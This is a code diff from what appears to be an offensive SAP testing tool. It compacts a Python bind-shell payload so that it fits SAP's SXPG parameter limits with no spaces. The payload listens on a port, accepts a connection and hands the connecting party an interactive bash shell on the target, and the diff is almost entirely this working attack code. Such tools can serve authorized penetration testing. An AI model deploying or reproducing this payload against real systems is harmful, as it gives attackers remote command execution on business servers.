@@ -422,19 +422,24 @@ def _generate_bind_payload(os_type: str, port: int) -> dict:
         }
     else:
         # Bind shell: listen on target, SAPMAP connects to it.
-        # Zero spaces in code (SAPXPG splits at spaces).
+        # Zero spaces, under 255 chars (SXPG PARAMS limit).
+        # Use short aliases: o=os, d=dup2, f=fileno
         py_code = (
+            f"import(socket,os,subprocess);"  # dummy — replaced below
+        )
+        # Build compact code under 250 chars
+        py_code = (
+            f"o=__import__('os');"
             f"s=__import__('socket').socket(2,1);"
             f"s.setsockopt(1,2,1);"
-            f"s.bind(('0.0.0.0',{port}));"
+            f"s.bind(('',{port}));"
             f"s.listen(1);"
             f"c,a=s.accept();"
-            f"__import__('os').dup2(c.fileno(),0);"
-            f"__import__('os').dup2(c.fileno(),1);"
-            f"__import__('os').dup2(c.fileno(),2);"
+            f"[o.dup2(c.fileno(),i)for(i)in(0,1,2)];"
             f"__import__('subprocess').call(['/bin/bash','-i'])"
         )
         assert " " not in py_code, f"Space in bind payload: {py_code}"
+        assert len(py_code) < 252, f"Bind payload too long: {len(py_code)} chars"
         return {
             "command": "python3",
             "params": f"-c {py_code}",
